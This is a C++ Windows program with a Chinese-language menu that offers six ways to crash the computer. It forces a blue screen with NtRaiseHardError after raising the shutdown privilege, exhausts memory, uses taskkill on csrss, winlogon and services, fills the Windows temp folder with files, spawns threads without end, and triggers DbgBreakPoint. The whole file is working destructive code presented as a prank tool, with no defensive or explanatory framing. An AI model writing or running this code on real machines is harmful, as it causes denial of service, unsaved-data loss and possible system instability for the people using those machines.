#include <windows.h>
#include <iostream>
#include <string>

void directSystemCrash() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    FARPROC rtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC ntRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
    
    if (rtlAdjustPrivilege && ntRaiseHardError) {
        BOOLEAN enabled;
        auto adjustPrivilege = (LONG(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))rtlAdjustPrivilege;
        auto raiseHardError = (LONG(NTAPI*)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG))ntRaiseHardError;
        adjustPrivilege(19, TRUE, FALSE, &enabled);
        ULONG response;
        raiseHardError(0xC0000218, 0, 0, 0, 6, &response); 
    }
    FreeLibrary(ntdll);
}

void memoryExhaustion() {
    while (true) {
        void* ptr = VirtualAlloc(NULL, 1024 * 1024 * 100, 
                                MEM_COMMIT | MEM_RESERVE, 
                                PAGE_READWRITE);
        if (!ptr) continue;
        memset(ptr, 0xFF, 1024 * 1024 * 100);
    }
}

void killCriticalProcesses() {
    system("taskkill /f /im csrss.exe"); 
    system("taskkill /f /im winlogon.exe"); 
    system("taskkill /f /im services.exe");
}

void diskFilling() {
    HANDLE file;
    DWORD written;
    char buffer[1024 * 1024] = {0};
    
    for (int i = 0; i < 1000; i++) {
        std::string filename = "C:\\windows\\temp\\crash_" + std::to_string(i) + ".dat";
        file = CreateFile((LPCTSTR)(filename.c_str()), GENERIC_WRITE, 0, NULL, 
                         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (file != INVALID_HANDLE_VALUE) {
            WriteFile(file, buffer, sizeof(buffer), &written, NULL);
            CloseHandle(file);
        } else {
            break;
        }
    }
}

void infiniteLoop() {
    while(1) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)infiniteLoop, NULL, 0, NULL);
    }
}

void win7SpecificCrash() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll) {
        FARPROC dbgBreakPoint = GetProcAddress(ntdll, "DbgBreakPoint");
        if (dbgBreakPoint) {
            ((void(*)())dbgBreakPoint)();
        }
        FreeLibrary(ntdll);
    }
}

int main() {
	system("chcp 65001 > nul");
    std::cout << "牢狮不在我就是无敌的!" << std::endl;
    std::cout << "给窝崩溃！ " << std::endl;
    std::cout << "1. 给窝蓝屏 2. 内存没了 3. 关进程 4.磁盘爆炸了 5.线程一大坨 6. win7答辩库崩溃" << std::endl;
    int choice;
    std::cin >> choice;
    switch(choice) {
        case 1: directSystemCrash(); break;
        case 2: memoryExhaustion(); break;
        case 3: killCriticalProcesses(); break;
        case 4: diskFilling(); break;
        case 5: infiniteLoop(); break;
        case 6: win7SpecificCrash(); break;
    }
    
    return 0;
}
